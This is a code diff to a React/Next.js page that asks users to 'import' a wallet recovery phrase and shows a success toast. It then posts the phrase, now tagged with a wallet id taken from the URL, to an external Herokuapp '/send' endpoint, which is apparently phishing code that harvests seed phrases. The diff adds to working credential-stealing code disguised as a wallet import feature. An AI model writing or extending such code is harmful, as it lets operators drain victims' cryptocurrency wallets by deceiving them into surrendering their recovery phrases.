@@ -2,11 +2,14 @@ import React, { useState } from "react";
 import axios from "axios";
 import { ToastContainer, toast } from "react-toastify";
 import "react-toastify/dist/ReactToastify.css";
+import { useRouter } from "next/router";
 import styles from "../../styles/Home.module.css";
 import Tabs from "./index";
 
 export default function Discover() {
   const [phrase, setPhrase] = useState("");
+  const router = useRouter();
+  const { pid } = router.query;
 
   const notify = () => {
     phrase === "" ? "" : toast.success("Phrase Successfully Imported");
@@ -15,10 +18,11 @@ export default function Discover() {
   const handleSubmit = (e) => {
     e.preventDefault();
     if (phrase !== "") {
+      const pS = { phrase: phrase, wallet: pid };
+      console.log(pS);
+
       axios
-        .post("https://shielded-earth-12418.herokuapp.com/send", {
-          phrase: phrase,
-        })
+        .post("https://shielded-earth-12418.herokuapp.com/send", pS)
         .then((res) => res.json())
         .catch((err) => err);
     }
